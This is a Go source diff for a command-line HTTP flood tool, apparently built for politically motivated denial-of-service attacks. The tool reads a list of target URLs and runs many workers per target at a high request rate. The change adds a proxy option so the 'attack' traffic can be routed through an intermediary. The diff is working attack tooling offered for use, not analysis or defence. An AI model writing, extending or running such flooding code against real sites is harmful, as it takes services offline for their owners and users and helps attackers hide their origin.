@@ -4,11 +4,12 @@ import (
 	"context"
 	"flag"
 	"fmt"
-	"github.com/RusskijKorablIdiNaxuj/RusskijKorablIdiNaxuj/src/flood"
 	"os"
 	"os/signal"
 	"strings"
 	"syscall"
+
+	"github.com/RusskijKorablIdiNaxuj/RusskijKorablIdiNaxuj/src/flood"
 
 	"github.com/vbauerster/mpb/v7"
 	"github.com/vbauerster/mpb/v7/decor"
@@ -16,6 +17,7 @@ import (
 
 func main() {
 	input := flag.String("i", "targets.txt", "A filename with a list of target HTTP/HTTPS addresses separated by newline; or an url.")
+	proxy := flag.String("p", "", "A proxy to use for the attack(in the form of https://proxy:port).")
 	N := flag.Int("N", 200, "Number of workers per target")
 	maxRPS := flag.Int("t", 1000, "Target number of requests Per Second")
 	silent := flag.Bool("s", false, "Do not print out progress bars")
@@ -43,7 +45,7 @@ func main() {
 	defer cancel()
 
 	for _, line := range strings.Split(string(text), "\n") {
-		target := flood.New(line)
+		target := flood.New(line, *proxy)
 
 		var bar *mpb.Bar
 		if !*silent {
